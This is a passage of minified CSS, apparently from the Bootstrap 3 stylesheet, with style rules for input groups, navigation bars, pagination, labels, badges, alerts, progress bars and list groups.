input[type=radio]{position:absolute;clip:rect(0,0,0,0);pointer-events:none}.input-group{position:relative;display:table;border-collapse:separate}.input-group[class*=col-]{float:none;padding-right:0;padding-left:0}.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}.input-group-lg>.form-control,.input-group-lg>.input-group-addon,.input-group-lg>.input-group-btn>.btn{height:46px;padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}select.input-group-lg>.form-control,select.input-group-lg>.input-group-addon,select.input-group-lg>.input-group-btn>.btn{height:46px;line-height:46px}select[multiple].input-group-lg>.form-control,select[multiple].input-group-lg>.input-group-addon,select[multiple].input-group-lg>.input-group-btn>.btn,textarea.input-group-lg>.form-control,textarea.input-group-lg>.input-group-addon,textarea.input-group-lg>.input-group-btn>.btn{height:auto}.input-group-sm>.form-control,.input-group-sm>.input-group-addon,.input-group-sm>.input-group-btn>.btn{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.input-group-sm>.form-control,select.input-group-sm>.input-group-addon,select.input-group-sm>.input-group-btn>.btn{height:30px;line-height:30px}select[multiple].input-group-sm>.form-control,select[multiple].input-group-sm>.input-group-addon,select[multiple].input-group-sm>.input-group-btn>.btn,textarea.input-group-sm>.form-control,textarea.input-group-sm>.input-group-addon,textarea.input-group-sm>.input-group-btn>.btn{height:auto}.input-group .form-control,.input-group-addon,.input-group-btn{display:table-cell}.input-group .form-control:not(:first-child):not(:last-child),.input-group-addon:not(:first-child):not(:last-child),.input-group-btn:not(:first-child):not(:last-child){border-radius:0}.input-group-addon,.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}.input-group-addon{padding:6px 12px;font-size:14px;font-weight:400;line-height:1;color:#555;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px}.input-group-addon.input-sm{padding:5px 10px;font-size:12px;border-radius:3px}.input-group-addon.input-lg{padding:10px 16px;font-size:18px;border-radius:6px}.input-group-addon input[type=checkbox],.input-group-addon input[type=radio]{margin-top:0}.input-group .form-control:first-child,.input-group-addon:first-child,.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group>.btn,.input-group-btn:first-child>.dropdown-toggle,.input-group-btn:last-child>.btn-group:not(:last-child)>.btn,.input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}.input-group-addon:first-child{border-right:0}.input-group .form-control:last-child,.input-group-addon:last-child,.input-group-btn:first-child>.btn-group:not(:first-child)>.btn,.input-group-btn:first-child>.btn:not(:first-child),.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group>.btn,.input-group-btn:last-child>.dropdown-toggle{border-top-left-radius:0;border-bottom-left-radius:0}.input-group-addon:last-child{border-left:0}.input-group-btn{position:relative;font-size:0;white-space:nowrap}.input-group-btn>.btn{position:relative}.input-group-btn>.btn+.btn{margin-left:-1px}.input-group-btn>.btn:active,.input-group-btn>.btn:focus,.input-group-btn>.btn:hover{z-index:2}.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group{margin-right:-1px}.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group{margin-left:-1px}.nav{padding-left:0;margin-bottom:0;list-style:none}.nav>li{position:relative;display:block}.nav>li>a{position:relative;display:block;padding:10px 15px}.nav>li>a:focus,.nav>li>a:hover{text-decoration:none;background-color:#eee}.nav>li.disabled>a{color:#777}.nav>li.disabled>a:focus,.nav>li.disabled>a:hover{color:#777;text-decoration:none;cursor:not-allowed;background-color:transparent}.nav .open>a,.nav .open>a:focus,.nav .open>a:hover{background-color:#eee;border-color:#337ab7}.nav .nav-divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.nav>li>a>img{max-width:none}.nav-tabs{border-bottom:1px solid #ddd}.nav-tabs>li{float:left;margin-bottom:-1px}.nav-tabs>li>a{margin-right:2px;line-height:1.42857143;border:1px solid transparent;border-radius:4px 4px 0 0}.nav-tabs>li>a:hover{border-color:#eee #eee #ddd}.nav-tabs>li.active>a,.nav-tabs>li.active>a:focus,.nav-tabs>li.active>a:hover{color:#555;cursor:default;background-color:#fff;border:1px solid #ddd;border-bottom-color:transparent}.nav-tabs.nav-justified{width:100%;border-bottom:0}.nav-tabs.nav-justified>li{float:none}.nav-tabs.nav-justified>li>a{margin-bottom:5px;text-align:center}.nav-tabs.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-tabs.nav-justified>li{display:table-cell;width:1%}.nav-tabs.nav-justified>li>a{margin-bottom:0}}.nav-tabs.nav-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border:1px solid #ddd}@media (min-width:768px){.nav-tabs.nav-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border-bottom-color:#fff}}.nav-pills>li{float:left}.nav-pills>li>a{border-radius:4px}.nav-pills>li+li{margin-left:2px}.nav-pills>li.active>a,.nav-pills>li.active>a:focus,.nav-pills>li.active>a:hover{color:#fff;background-color:#337ab7}.nav-stacked>li{float:none}.nav-stacked>li+li{margin-top:2px;margin-left:0}.nav-justified{width:100%}.nav-justified>li{float:none}.nav-justified>li>a{margin-bottom:5px;text-align:center}.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-justified>li{display:table-cell;width:1%}.nav-justified>li>a{margin-bottom:0}}.nav-tabs-justified{border-bottom:0}.nav-tabs-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border:1px solid #ddd}@media (min-width:768px){.nav-tabs-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border-bottom-color:#fff}}.tab-content>.tab-pane{display:none;visibility:hidden}.tab-content>.active{display:block;visibility:visible}.nav-tabs .dropdown-menu{margin-top:-1px;border-top-left-radius:0;border-top-right-radius:0}.navbar{position:relative;min-height:50px;margin-bottom:20px;border:1px solid transparent}@media (min-width:768px){.navbar{border-radius:4px}}@media (min-width:768px){.navbar-header{float:left}}.navbar-collapse{padding-right:15px;padding-left:15px;overflow-x:visible;-webkit-overflow-scrolling:touch;border-top:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 0 rgba(255,255,255,.1)}.navbar-collapse.in{overflow-y:auto}@media (min-width:768px){.navbar-collapse{width:auto;border-top:0;-webkit-box-shadow:none;box-shadow:none}.navbar-collapse.collapse{display:block!important;height:auto!important;padding-bottom:0;overflow:visible!important;visibility:visible!important}.navbar-collapse.in{overflow-y:visible}.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse,.navbar-static-top .navbar-collapse{padding-right:0;padding-left:0}}.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:340px}@media (max-device-width:480px) and (orientation:landscape){.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:200px}}.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:-15px;margin-left:-15px}@media (min-width:768px){.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:0;margin-left:0}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width:768px){.navbar-static-top{border-radius:0}}.navbar-fixed-bottom,.navbar-fixed-top{position:fixed;right:0;left:0;z-index:1030}@media (min-width:768px){.navbar-fixed-bottom,.navbar-fixed-top{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}.navbar-brand{float:left;height:50px;padding:15px 15px;font-size:18px;line-height:20px}.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}.navbar-brand>img{display:block}@media (min-width:768px){.navbar>.container .navbar-brand,.navbar>.container-fluid .navbar-brand{margin-left:-15px}}.navbar-toggle{position:relative;float:right;padding:9px 10px;margin-top:8px;margin-right:15px;margin-bottom:8px;background-color:transparent;background-image:none;border:1px solid transparent;border-radius:4px}.navbar-toggle:focus{outline:0}.navbar-toggle .icon-bar{display:block;width:22px;height:2px;border-radius:1px}.navbar-toggle .icon-bar+.icon-bar{margin-top:4px}@media (min-width:768px){.navbar-toggle{display:none}}.navbar-nav{margin:7.5px -15px}.navbar-nav>li>a{padding-top:10px;padding-bottom:10px;line-height:20px}@media (max-width:767px){.navbar-nav .open .dropdown-menu{position:static;float:none;width:auto;margin-top:0;background-color:transparent;border:0;-webkit-box-shadow:none;box-shadow:none}.navbar-nav .open .dropdown-menu .dropdown-header,.navbar-nav .open .dropdown-menu>li>a{padding:5px 15px 5px 25px}.navbar-nav .open .dropdown-menu>li>a{line-height:20px}.navbar-nav .open .dropdown-menu>li>a:focus,.navbar-nav .open .dropdown-menu>li>a:hover{background-image:none}}@media (min-width:768px){.navbar-nav{float:left;margin:0}.navbar-nav>li{float:left}.navbar-nav>li>a{padding-top:15px;padding-bottom:15px}}.navbar-form{padding:10px 15px;margin-top:8px;margin-right:-15px;margin-bottom:8px;margin-left:-15px;border-top:1px solid transparent;border-bottom:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1)}@media (min-width:768px){.navbar-form .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.navbar-form .form-control{display:inline-block;width:auto;vertical-align:middle}.navbar-form .form-control-static{display:inline-block}.navbar-form .input-group{display:inline-table;vertical-align:middle}.navbar-form .input-group .form-control,.navbar-form .input-group .input-group-addon,.navbar-form .input-group .input-group-btn{width:auto}.navbar-form .input-group>.form-control{width:100%}.navbar-form .control-label{margin-bottom:0;vertical-align:middle}.navbar-form .checkbox,.navbar-form .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.navbar-form .checkbox label,.navbar-form .radio label{padding-left:0}.navbar-form .checkbox input[type=checkbox],.navbar-form .radio input[type=radio]{position:relative;margin-left:0}.navbar-form .has-feedback .form-control-feedback{top:0}}@media (max-width:767px){.navbar-form .form-group{margin-bottom:5px}.navbar-form .form-group:last-child{margin-bottom:0}}@media (min-width:768px){.navbar-form{width:auto;padding-top:0;padding-bottom:0;margin-right:0;margin-left:0;border:0;-webkit-box-shadow:none;box-shadow:none}}.navbar-nav>li>.dropdown-menu{margin-top:0;border-top-left-radius:0;border-top-right-radius:0}.navbar-fixed-bottom .navbar-nav>li>.dropdown-menu{border-top-left-radius:4px;border-top-right-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-btn{margin-top:8px;margin-bottom:8px}.navbar-btn.btn-sm{margin-top:10px;margin-bottom:10px}.navbar-btn.btn-xs{margin-top:14px;margin-bottom:14px}.navbar-text{margin-top:15px;margin-bottom:15px}@media (min-width:768px){.navbar-text{float:left;margin-right:15px;margin-left:15px}}@media (min-width:768px){.navbar-left{float:left!important}.navbar-right{float:right!important;margin-right:-15px}.navbar-right~.navbar-right{margin-right:0}}.navbar-default{background-color:#f8f8f8;border-color:#e7e7e7}.navbar-default .navbar-brand{color:#777}.navbar-default .navbar-brand:focus,.navbar-default .navbar-brand:hover{color:#5e5e5e;background-color:transparent}.navbar-default .navbar-text{color:#777}.navbar-default .navbar-nav>li>a{color:#777}.navbar-default .navbar-nav>li>a:focus,.navbar-default .navbar-nav>li>a:hover{color:#333;background-color:transparent}.navbar-default .navbar-nav>.active>a,.navbar-default .navbar-nav>.active>a:focus,.navbar-default .navbar-nav>.active>a:hover{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav>.disabled>a,.navbar-default .navbar-nav>.disabled>a:focus,.navbar-default .navbar-nav>.disabled>a:hover{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#ddd}.navbar-default .navbar-toggle:focus,.navbar-default .navbar-toggle:hover{background-color:#ddd}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#e7e7e7}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:focus,.navbar-default .navbar-nav>.open>a:hover{color:#555;background-color:#e7e7e7}@media (max-width:767px){.navbar-default .navbar-nav .open .dropdown-menu>li>a{color:#777}.navbar-default .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>li>a:hover{color:#333;background-color:transparent}.navbar-default .navbar-nav .open .dropdown-menu>.active>a,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#777}.navbar-default .navbar-link:hover{color:#333}.navbar-default .btn-link{color:#777}.navbar-default .btn-link:focus,.navbar-default .btn-link:hover{color:#333}.navbar-default .btn-link[disabled]:focus,.navbar-default .btn-link[disabled]:hover,fieldset[disabled] .navbar-default .btn-link:focus,fieldset[disabled] .navbar-default .btn-link:hover{color:#ccc}.navbar-inverse{background-color:#222;border-color:#080808}.navbar-inverse .navbar-brand{color:#9d9d9d}.navbar-inverse .navbar-brand:focus,.navbar-inverse .navbar-brand:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-text{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a:focus,.navbar-inverse .navbar-nav>li>a:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav>.active>a,.navbar-inverse .navbar-nav>.active>a:focus,.navbar-inverse .navbar-nav>.active>a:hover{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav>.disabled>a,.navbar-inverse .navbar-nav>.disabled>a:focus,.navbar-inverse .navbar-nav>.disabled>a:hover{color:#444;background-color:transparent}.navbar-inverse .navbar-toggle{border-color:#333}.navbar-inverse .navbar-toggle:focus,.navbar-inverse .navbar-toggle:hover{background-color:#333}.navbar-inverse .navbar-toggle .icon-bar{background-color:#fff}.navbar-inverse .navbar-collapse,.navbar-inverse .navbar-form{border-color:#101010}.navbar-inverse .navbar-nav>.open>a,.navbar-inverse .navbar-nav>.open>a:focus,.navbar-inverse .navbar-nav>.open>a:hover{color:#fff;background-color:#080808}@media (max-width:767px){.navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header{border-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu .divider{background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#444;background-color:transparent}}.navbar-inverse .navbar-link{color:#9d9d9d}.navbar-inverse .navbar-link:hover{color:#fff}.navbar-inverse .btn-link{color:#9d9d9d}.navbar-inverse .btn-link:focus,.navbar-inverse .btn-link:hover{color:#fff}.navbar-inverse .btn-link[disabled]:focus,.navbar-inverse .btn-link[disabled]:hover,fieldset[disabled] .navbar-inverse .btn-link:focus,fieldset[disabled] .navbar-inverse .btn-link:hover{color:#444}.breadcrumb{padding:8px 15px;margin-bottom:20px;list-style:none;background-color:#f5f5f5;border-radius:4px}.breadcrumb>li{display:inline-block}.breadcrumb>li+li:before{padding:0 5px;color:#ccc;content:"/\00a0"}.breadcrumb>.active{color:#777}.pagination{display:inline-block;padding-left:0;margin:20px 0;border-radius:4px}.pagination>li{display:inline}.pagination>li>a,.pagination>li>span{position:relative;float:left;padding:6px 12px;margin-left:-1px;line-height:1.42857143;color:#337ab7;text-decoration:none;background-color:#fff;border:1px solid #ddd}.pagination>li:first-child>a,.pagination>li:first-child>span{margin-left:0;border-top-left-radius:4px;border-bottom-left-radius:4px}.pagination>li:last-child>a,.pagination>li:last-child>span{border-top-right-radius:4px;border-bottom-right-radius:4px}.pagination>li>a:focus,.pagination>li>a:hover,.pagination>li>span:focus,.pagination>li>span:hover{color:#23527c;background-color:#eee;border-color:#ddd}.pagination>.active>a,.pagination>.active>a:focus,.pagination>.active>a:hover,.pagination>.active>span,.pagination>.active>span:focus,.pagination>.active>span:hover{z-index:2;color:#fff;cursor:default;background-color:#337ab7;border-color:#337ab7}.pagination>.disabled>a,.pagination>.disabled>a:focus,.pagination>.disabled>a:hover,.pagination>.disabled>span,.pagination>.disabled>span:focus,.pagination>.disabled>span:hover{color:#777;cursor:not-allowed;background-color:#fff;border-color:#ddd}.pagination-lg>li>a,.pagination-lg>li>span{padding:10px 16px;font-size:18px}.pagination-lg>li:first-child>a,.pagination-lg>li:first-child>span{border-top-left-radius:6px;border-bottom-left-radius:6px}.pagination-lg>li:last-child>a,.pagination-lg>li:last-child>span{border-top-right-radius:6px;border-bottom-right-radius:6px}.pagination-sm>li>a,.pagination-sm>li>span{padding:5px 10px;font-size:12px}.pagination-sm>li:first-child>a,.pagination-sm>li:first-child>span{border-top-left-radius:3px;border-bottom-left-radius:3px}.pagination-sm>li:last-child>a,.pagination-sm>li:last-child>span{border-top-right-radius:3px;border-bottom-right-radius:3px}.pager{padding-left:0;margin:20px 0;text-align:center;list-style:none}.pager li{display:inline}.pager li>a,.pager li>span{display:inline-block;padding:5px 14px;background-color:#fff;border:1px solid #ddd;border-radius:15px}.pager li>a:focus,.pager li>a:hover{text-decoration:none;background-color:#eee}.pager .next>a,.pager .next>span{float:right}.pager .previous>a,.pager .previous>span{float:left}.pager .disabled>a,.pager .disabled>a:focus,.pager .disabled>a:hover,.pager .disabled>span{color:#777;cursor:not-allowed;background-color:#fff}.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:focus,a.label:hover{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:focus,.label-default[href]:hover{background-color:#5e5e5e}.label-primary{background-color:#337ab7}.label-primary[href]:focus,.label-primary[href]:hover{background-color:#286090}.label-success{background-color:#5cb85c}.label-success[href]:focus,.label-success[href]:hover{background-color:#449d44}.label-info{background-color:#5bc0de}.label-info[href]:focus,.label-info[href]:hover{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:focus,.label-warning[href]:hover{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:focus,.label-danger[href]:hover{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:12px;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;background-color:#777;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge{top:0;padding:1px 5px}a.badge:focus,a.badge:hover{color:#fff;text-decoration:none;cursor:pointer}.list-group-item.active>.badge,.nav-pills>.active>a>.badge{color:#337ab7;background-color:#fff}.list-group-item>.badge{float:right}.list-group-item>.badge+.badge{margin-right:5px}.nav-pills>li>a>.badge{margin-left:3px}.jumbotron{padding:30px 15px;margin-bottom:30px;color:inherit;background-color:#eee}.jumbotron .h1,.jumbotron h1{color:inherit}.jumbotron p{margin-bottom:15px;font-size:21px;font-weight:200}.jumbotron>hr{border-top-color:#d5d5d5}.container .jumbotron,.container-fluid .jumbotron{border-radius:6px}.jumbotron .container{max-width:100%}@media screen and (min-width:768px){.jumbotron{padding:48px 0}.container .jumbotron,.container-fluid .jumbotron{padding-right:60px;padding-left:60px}.jumbotron .h1,.jumbotron h1{font-size:63px}}.thumbnail{display:block;padding:4px;margin-bottom:20px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:border .2s ease-in-out;-o-transition:border .2s ease-in-out;transition:border .2s ease-in-out}.thumbnail a>img,.thumbnail>img{margin-right:auto;margin-left:auto}a.thumbnail.active,a.thumbnail:focus,a.thumbnail:hover{border-color:#337ab7}.thumbnail .caption{padding:9px;color:#333}.alert{padding:15px;margin-bottom:20px;border:1px solid transparent;border-radius:4px}.alert h4{margin-top:0;color:inherit}.alert .alert-link{font-weight:700}.alert>p,.alert>ul{margin-bottom:0}.alert>p+p{margin-top:5px}.alert-dismissable,.alert-dismissible{padding-right:35px}.alert-dismissable .close,.alert-dismissible .close{position:relative;top:-2px;right:-21px;color:inherit}.alert-success{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}.alert-success hr{border-top-color:#c9e2b3}.alert-success .alert-link{color:#2b542c}.alert-info{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}.alert-info hr{border-top-color:#a6e1ec}.alert-info .alert-link{color:#245269}.alert-warning{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}.alert-warning hr{border-top-color:#f7e1b5}.alert-warning .alert-link{color:#66512c}.alert-danger{color:#a94442;background-color:#f2dede;border-color:#ebccd1}.alert-danger hr{border-top-color:#e4b9c0}.alert-danger .alert-link{color:#843534}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@-o-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.progress{height:20px;margin-bottom:20px;overflow:hidden;background-color:#f5f5f5;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}.progress-bar{float:left;width:0;height:100%;font-size:12px;line-height:20px;color:#fff;text-align:center;background-color:#337ab7;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);-webkit-transition:width .6s ease;-o-transition:width .6s ease;transition:width .6s ease}.progress-bar-striped,.progress-striped .progress-bar{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);-webkit-background-size:40px 40px;background-size:40px 40px}.progress-bar.active,.progress.active .progress-bar{-webkit-animation:progress-bar-stripes 2s linear infinite;-o-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}.progress-bar-success{background-color:#5cb85c}.progress-striped .progress-bar-success{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-info{background-color:#5bc0de}.progress-striped .progress-bar-info{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-warning{background-color:#f0ad4e}.progress-striped .progress-bar-warning{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-danger{background-color:#d9534f}.progress-striped .progress-bar-danger{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.media{margin-top:15px}.media:first-child{margin-top:0}.media-right,.media>.pull-right{padding-left:10px}.media-left,.media>.pull-left{padding-right:10px}.media-body,.media-left,.media-right{display:table-cell;vertical-align:top}.media-middle{vertical-align:middle}.media-bottom{vertical-align:bottom}.media-heading{margin-top:0;margin-bottom:5px}.media-list{padding-left:0;list-style:none}.list-group{padding-left:0;margin-bottom:20px}.list-group-item{position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#fff;border:1px solid #ddd}.list-group-item:first-child{border-top-left-radius:4px;border-top-right-radius:4px}.list-group-item:last-child{margin-bottom:0;border-bottom-right-radius:4px;border-bottom-left-radius:4px}a.list-group-item{color:#555}a.list-group-item .list-group-item-heading{color:#333}a.list-group-item:focus,a.list-group-item:hover{color:#555;text-decoration:none;background-color:#f5f5f5}.list-group-item.disabled,.list-group-item.disabled:focus,.list-group-item.disabled:hover{color:#777;cursor:not-allowed;background-color:#eee}.list-group-item.disabled .list-group-item-heading,.list-group-item.disabled:focus .list-group-item-heading,.list-group-item.disabled:hover .list-group-item-heading{color:inherit}.list-group-item.disabled .list-group-item-text,.list-group-item.disabled:focus .list-group-item-text,.list-group-item.disabled:hover .list-group-item-text{color:#777}.list-group-item.active,.list-group-item.active:focus,.list-group-item.active:hover{z-index:2;color:#fff;background-color:#337ab7;border-color:#337ab7}.list-group-item.active .list-group-item-heading,.list-group-item.active .list-group-item-heading>.small,.list-group-item.active .list-group-item-heading>small,.list-group-item.active:focus .list-group-item-heading,.list-group-item.active:focus .list-group-item-heading>.small,.list-group-item.active:focus .list-group-item-heading>small,.list-group-item.active:hover .list-group-item-heading,.list-group-item.active:hover .list-group-item-heading>.small,.list-group-item.active:hover .list-group-item-heading>small{color:inherit}.list-group-item.active .list-group-item-text,.list-group-item.active:focus .list-group-item-text,.list-group-item.active:hover .list-group-item-text{color:#c7ddef}.list-group-item-success{color:#3c763d;background-color:#dff0d8}a.list-group-item-success{color:#3c763d}a.list-group-item-success .list-group-item-heading{color:inherit}a.list-group-item-success:focus,a.list-group-item-success:hover{color:#3c763d;background-color:#d0e9c6}a.list-group-item-success.active,a.list-group-item-success.active:focus,a.list-group-item-success.active:hover{color:#fff;background-color:#3c763d;border-color:#3c763d}.list-group-item-info{color:#31708f;background-color:#d9edf7}a.list-group-item-info{color:#31708f}a.list-group-item-info .list-group-item-heading{color:inherit}a.list-group-item-info:focus,a.list-group-item-info:hover{color:#31708f;background-color:#c4e3f3}a.list-group-item-info.active,a.list-group-item-info.active:focus,a.list-group-item-info.active:hover{color:#fff;background-color:#31708f;border-color:#31708f}.list-group-item-warning{color:#8a6d3b;background-color:#fcf8e3}a.list-group-item-warning{color:#8a6d3b}a.list-group-item-warning .list-group-item-heading{color:inherit}a.list-group-item-warning:focus,a.list-group-item-warning:hover{color:#8a6d3b;background-color:#faf2cc}a.list-group-item-warning.active,a.list-group-item-warning.active:focus,a.list-group-item-warning.active:hover{color:#fff;background-color:#8a6d3b;border-color:#8a6d3b}.list-group-item-danger{color:#a94442;background-color:#f2dede}a.list-group-item-danger{color:#a94442}a.list-group-item-danger .list-group-item-heading{color:inherit}a.list-group-item-danger:focus,a.list-group-item-danger:hover{color:#a94442;background-color:#ebcccc}a.list-group-item-danger.active,a.list-group-item-danger.active:focus,a.list-group-item-danger.active:hover{color:#fff;background-color:#a94442;border-color:#a94442}.list-group-item-heading{margin-top:0;margin-bottom:5px}.list-group-item-text{margin-bottom:0;line-height:1.3}.panel{margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.05);box-shadow:0 1px 1px 